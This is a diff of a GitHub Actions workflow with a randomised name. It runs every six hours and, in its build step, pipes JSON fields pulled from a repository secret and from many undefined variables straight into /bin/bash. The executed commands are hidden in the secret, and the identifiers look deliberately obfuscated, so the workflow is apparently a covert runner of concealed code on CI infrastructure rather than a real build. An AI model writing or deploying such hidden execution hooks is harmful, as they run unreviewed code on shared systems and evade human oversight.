@@ -3,31 +3,30 @@ name: yingongfei2389
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 1/6 * * *'
-
-jobs:  # 20586
+    - cron: '50 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yingongfei2389
         env:
-          jy40: ${{ secrets.jy40 }}
+          qpk41: ${{ secrets.qpk41 }}
         run: |
-          echo $jy40 | jq -r .whdng59017 | /bin/bash
-          echo $uo09877 | jq -r .vw714 | /bin/bash
-          echo $yepm14681 | jq -r .gdqq34 | /bin/bash
-          echo $xgwv2388 | jq -r .slqx8 | /bin/bash
-          echo $ebkqy818 | jq -r .cyca7105 | /bin/bash
-          echo $d49158 | jq -r .hkzqe40 | /bin/bash
-          echo $xrl7 | jq -r .yb97692 | /bin/bash
-          echo $gnfux8984 | jq -r .p38292 | /bin/bash
-          echo $ar129 | jq -r .blmg0 | /bin/bash
-          echo $xmzsm74 | jq -r .phni8 | /bin/bash
-          echo $zjiz18 | jq -r .fajfr67113 | /bin/bash
-          echo $i4 | jq -r .di97 | /bin/bash
-          echo $mn93331 | jq -r .q64422 | /bin/bash
-          echo $xcni0 | jq -r .mwdw81511 | /bin/bash
-          echo $jaxz4132 | jq -r .oxd542 | /bin/bash
-          echo $bhrqt572 | jq -r .zxm61 | /bin/bash
+          echo $qpk41 | jq -r .e90002 | /bin/bash
+          echo $u2 | jq -r .ox0 | /bin/bash
+          echo $kvq1965 | jq -r .dz42 | /bin/bash
+          echo $lubm4 | jq -r .ofk76 | /bin/bash
+          echo $tutl9670 | jq -r .ptc03 | /bin/bash
+          echo $dqoc275 | jq -r .bic3953 | /bin/bash
+          echo $bxyw7691 | jq -r .oi5050 | /bin/bash
+          echo $tgqg61769 | jq -r .qfw24869 | /bin/bash
+          echo $jfba9243 | jq -r .qsll50 | /bin/bash
+          echo $kjgsc1044 | jq -r .mmlp8969 | /bin/bash
+          echo $p778 | jq -r .ctk990 | /bin/bash
+          echo $yzj2 | jq -r .vryp4153 | /bin/bash
+          echo $f341 | jq -r .hfo4988 | /bin/bash
+          echo $gr6 | jq -r .vxh00872 | /bin/bash
+          echo $zmg621 | jq -r .ewl039 | /bin/bash
 
